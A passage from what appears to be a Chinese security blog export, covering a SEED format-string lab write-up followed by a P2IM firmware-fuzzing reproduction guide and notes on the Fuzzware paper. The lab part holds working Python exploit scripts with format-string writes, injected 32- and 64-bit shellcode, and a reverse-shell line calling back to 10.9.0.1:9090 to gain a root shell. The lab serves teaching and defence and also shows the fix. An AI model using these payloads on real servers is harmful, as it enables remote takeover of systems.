<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number_1 = number + <span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number_1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43137x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功修改成目标值</p>
<img src="/posts/5a0832a9/image-20231211164056253.png" class="" title="image-20231211164056253">

<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><img src="/posts/5a0832a9/image-20231211164407343.png" class="" title="image-20231211164407343">

<p><strong>Question 1: What are the memory addresses at the locations marked by 2 and 3?</strong></p>
<p>  ②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffcfac</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd080</code></p>
<p><strong>Question 2: How many %x format specifiers do we need to move the format string argument pointerto 3? Remember, the argument pointer starts from the location above 1.</strong></p>
<p>由上文可知，buf的前四字节需要64个%x才可以达到。</p>
<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>获取server的shell。</p>
<p>需要修改函数<code>myprintf</code>的返回地址为<code>shellcode</code>地址，将<code>shellcode</code>放在buf末尾，然后使用上文的方法将shellcode地址写入返回地址即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">shellcode_addr = <span class="number">0xffffd5d4</span>  <span class="comment"># 0xffffd080 + start</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">number  = <span class="number">0xffffcfa8</span> + <span class="number">4</span></span><br><span class="line">number_1 = number + <span class="number">2</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (number_1).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.54170x&quot;</span>  + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;%.10795x&quot;</span> + <span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功执行shellcode。</p>
<img src="/posts/5a0832a9/image-20231211170251532.png" class="" title="image-20231211170251532">

<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击64位机器，服务器选择10.9.0.6.首先发送hello消息</p>
<img src="/posts/5a0832a9/image-20231211170653364.png" class="" title="image-20231211170653364">

<p>问题：64位机器地址前两个字符为0x00，导致printf在解析地址时遇到<code>0x00</code>会停止解析（与overflow中strcpy不同，strcpy会直接截断，而此处的input仍然会传入，只是printf不会解析）</p>
<p>可以使用<code>$kth</code>表示第k个参数，同时将地址放在input末尾避免此问题。</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">buf_addr = <span class="number">0x00007fffffffe5c0</span></span><br><span class="line">ret_addr = <span class="number">0x00007fffffffe500</span> + <span class="number">8</span></span><br><span class="line">shellcode_addr = buf_addr + start  <span class="comment"># 0x7fffffffeaf7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># target_addr for test</span></span><br><span class="line">target_addr = <span class="number">0x0000555555558010</span></span><br><span class="line">number  = ret_addr</span><br><span class="line">number1 = number + <span class="number">2</span></span><br><span class="line">number2 = number + <span class="number">4</span></span><br><span class="line">number3 = number + <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%46$.32767lx&quot;</span> + <span class="string">&quot;%46$hn&quot;</span> + <span class="string">&quot;%44$.27384lx&quot;</span> + <span class="string">&quot;%44$hn&quot;</span> + <span class="string">&quot;%45$.5384lx&quot;</span> + <span class="string">&quot;%45$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &quot;%44$lx.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">content[offset:offset+<span class="number">8</span>] = (number).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">8</span>:offset+<span class="number">16</span>] = (number1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">16</span>:offset+<span class="number">24</span>] = (number2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>其中需要注意高位地址恒为<code>0x0000</code>不需要修改，其他三个都需要进行修改。</p>
<img src="/posts/5a0832a9/image-20231211193743193.png" class="" title="image-20231211193743193">

<h3 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h3><p>修改如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br></pre></td></tr></table></figure>

<p>重新编译发现警告信息消失：</p>
<img src="/posts/5a0832a9/image-20231211194112960.png" class="" title="image-20231211194112960">

<p>重新进行攻击，尝试打印出前100个参数，失败：</p>
<img src="/posts/5a0832a9/image-20231211194819158.png" class="" title="image-20231211194819158">

<h3 id="9-Guidelines-on-Reverse-Shell"><a href="#9-Guidelines-on-Reverse-Shell" class="headerlink" title="9 Guidelines on Reverse Shell"></a>9 Guidelines on Reverse Shell</h3><p>只需修改shellcode内容即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>成功获取root shell</p>
<img src="/posts/5a0832a9/image-20231211195911628.png" class="" title="image-20231211195911628">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>SEED</tag>
        <tag>Lab</tag>
        <tag>Format</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM复现</title>
    <url>/posts/5786d6f8.html</url>
    <content><![CDATA[<p>导师说要多实践，因此将看过的P2IM论文进行复现，同时对源码进行简单查看。</p>
<p>看网上并没有相关的复现教程，因此写下该博客</p>
<p>链接: <a href="https://github.com/RiS3-Lab/p2im">https://github.com/RiS3-Lab/p2im</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 16.04 !!!（重中之重！其他版本可能不成功）</p>
<p>GNU Arm Embedded Toolchain：<a href="https://developer.arm.com/downloads/-/gnu-rm">https://developer.arm.com/downloads/-/gnu-rm</a></p>
<p>fuzz target: <a href="https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary">https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary</a></p>
<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><ol>
<li><p>首先下载p2im源码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RiS3-Lab/p2im.git</span><br><span class="line"><span class="built_in">cd</span> p2im</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载子项目</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># submodules are cloned into externals/</span></span><br><span class="line">git submodule update --init</span><br><span class="line">git submodule update --remote</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载并解压GNU Arm Embedded Toolchain，并且将其内&#x2F;bin目录添加到环境变量</p>
</li>
<li><p>编译AFL，ubuntu16.04测试没有问题，ubuntu22.04不行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile AFL</span></span><br><span class="line">make -C afl/</span><br></pre></td></tr></table></figure>
</li>
<li><p>Qemu已经在项目里预编译好了，不需要额外配置</p>
</li>
</ol>
<h2 id="3-Fuzzing"><a href="#3-Fuzzing" class="headerlink" title="3. Fuzzing"></a>3. Fuzzing</h2><ol>
<li><p>确定工作区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WORKING_DIR=&lt;repo_path&gt;/fuzzing/&lt;firmware_name&gt;/&lt;fuzzing_run_num&gt;/</span><br><span class="line">mkdir -p $&#123;WORKING_DIR&#125;</span><br><span class="line">cd $&#123;WORKING_DIR&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将输入seed文件复制到工作区&#x2F;inputs文件夹下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the <span class="string">&quot;random&quot;</span> seed to the working directory</span></span><br><span class="line">cp -r &lt;repo_path&gt;/fuzzing/templates/seeds/ $&#123;WORKING_DIR&#125;/inputs</span><br></pre></td></tr></table></figure>
</li>
<li><p>将配置文件fuzz.cfg.template文件复制到工作区下，注意：文件名和内容需要根据修改！要把文件内&lt;&gt;的内容改为实际绝对地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the template to the working directory</span></span><br><span class="line">cp &lt;repo_path&gt;/fuzzing/templates/fuzz.cfg.template fuzz.cfg</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始fuzz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;repo_path&gt;/model_instantiation/fuzz.py -c fuzz.cfg</span><br></pre></td></tr></table></figure>

<p>难绷，还是报错。。。不知道是哪儿的问题。。。</p>
<img src="/posts/5786d6f8/image-20231218185021864.png" class="" title="image-20231218185021864"></li>
</ol>
<p>又试了几次，其中把报错上面的命令又跑了跑，再运行发现就可以了。。。</p>
<img src="/posts/5786d6f8/image-20231218190107050.png" class="" title="image-20231218190107050">

<img src="/posts/5786d6f8/image-20231218190125898.png" class="" title="image-20231218190125898">]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware论文笔记</title>
    <url>/posts/fd2ce383.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>实现了模拟器Fuzzware，特点：减少了fuzz的input开销，节省了时间。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>针对当前几种对固件模拟fuzz的方法的局限性进行了分析</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟。<strong>局限：过于high-level，无法发现外设驱动代码的漏洞。</strong></li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入<strong>局限：（分类需要大量人力，P2IM），且存在寄存器误分类的问题</strong></li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。<strong>局限：（存在路径消失问题，uEmu），代码覆盖率不够</strong></li>
</ul>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li><p>提出了一种细粒度的MMIO访问建模方法，将其与基于覆盖率引导的模糊测试结合</p>
<ul>
<li><p>能够识别比特级别的硬件行为（相较于P2IM的寄存器级别）</p>
</li>
<li><p>保留了固件的所有路径，没有路径消除（相较于uEmu的路径消除）</p>
</li>
<li><p>使用局部范围的动态符号执行分析硬件值的哪些部分实际有意义</p>
</li>
</ul>
</li>
<li><p>实现了Fuzzware，相较于uEmu，P2IM，代码覆盖率和通用性均有较大提升</p>
</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>没有对DMA实现自动化建模。</li>
<li>由于没有进行路径消除，导致会在一些位置陷入死循环或卡死的情况，可以通过针对卡死情况的路径消除进行改进。</li>
</ul>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>通过DSE（动态符号化执行）将MMIO的输入进行建模，查看其输入是否是全部都要用到（32bit全部有用），或者输入只需为常数或有限值即可。并根据建模结果对其输入进行特定的修剪。</p>
<h2 id="性能比较"><a href="#性能比较" class="headerlink" title="性能比较"></a>性能比较</h2><p>当前对固件未知外设接口的模拟（主要是为了能够确定fuzz输入点并减少fuzz内容，以便提高性能）有三种方法：分别为high-level模拟，基于access-pattern的模拟，基于符号化执行的模拟。</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟</li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入（分类需要大量人力）</li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。（存在路径消失问题）</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><ol>
<li><p>定义了两种输入开销：full input overhead（只有一个输入能让程序继续执行①）；Partial input overhead（③，32bit中只有8bit可以用到），figure 3中的case A，B，C，Default只需两个特定bit即可，mmio-&gt;status只需一个bit代表即可，而实际fuzzing input需要32bit代表输入，因此可以显著减少开销。1-2&#x2F;32(94%)和1-1&#x2F;32（97%）。</p>
<img src="/posts/fd2ce383/figure_2.png" class="" title="figure_2">

<img src="/posts/fd2ce383/figure_3.png" class="" title="figure_3">
</li>
<li><p>模型大致结构，fuzzing engine产生输入raw input，输入到MMIO，模型查看对应MMIO是否存在已建模的MMIO Access Model，如果是则将其根据分类模型将raw input转为实际输入，如果没有，则根据当前情况进行DSE对其进行分类建模。一轮输入停止后，获取反馈，优化输入。</p>
<img src="/posts/fd2ce383/figure_4.png" class="" title="figure_4">
</li>
<li><p>DSE过程：</p>
<ul>
<li><p>确定建模分析范围：跟踪MMIO的访问，如果内存或寄存器中存在其符号表达式则表明其存活，一直进行直到MMIO符号dead或函数返回或超时</p>
</li>
<li><p>模型分类定义</p>
<img src="/posts/fd2ce383/Table_1.png" class="" title="Table_1">

<img src="/posts/fd2ce383/model_definition_1.png" class="" title="model_definition_1">

<img src="/posts/fd2ce383/model_definition_2.png" class="" title="model_definition_2">
</li>
<li><p>实际建模：使用angr工具。</p>
<img src="/posts/fd2ce383/angr.png" class="" title="angr"></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
